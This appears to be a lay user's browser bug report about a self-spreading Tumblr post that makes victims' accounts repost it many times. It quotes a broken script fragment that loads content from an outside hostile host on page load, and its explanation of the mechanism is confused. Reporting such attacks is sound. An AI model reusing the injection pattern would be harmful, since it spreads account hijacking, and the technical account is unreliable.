Security vulnerability: Scripts can initiate background browser processes in tumblr
User Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:18.0) Gecko/20100101 Firefox/18.0
Build ID: 20121129165634

Steps to reproduce:

https://s3.amazonaws.com/data.tumblr.com/tumblr_megjy5T4M31qew8lco1_500.png

Clicking the video or the pictures from this particular post or visiting the script kiddie's home tumblr.


Actual results:

I'm no computer whiz here but basically once you click the pictures or videos it triggers the following stupid-ass base64 script:

var framekiller = true;
window.onload = function(){
  document.getElementById('lapper').src = i.hope.you.get.strangled.net";

}

Because tumblr uses a dialogue that somehow branches communication between the client and the server host (i.hope.you blah blah blah), the client immediately downloads some sort of background process that controls your tumblr. The script then makes your tumblr account post that stupid-ass post another 50-200 times and damn it's annoying.


Expected results:

It shoulda somehow blocked that shit ain't nobody got time for that.
